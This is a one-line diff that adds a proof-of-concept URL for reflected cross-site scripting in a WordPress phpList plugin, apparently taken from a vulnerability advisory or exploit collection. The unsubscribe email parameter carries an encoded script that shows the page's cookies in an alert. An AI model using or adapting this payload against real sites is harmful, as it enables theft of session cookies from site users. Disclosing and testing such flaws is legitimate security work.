@@ -1,0 +1,1 @@
+http://www.example.com/wp-phplist.php?p=unsubscribe&amp;id=1&amp;unsubscribeemail=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
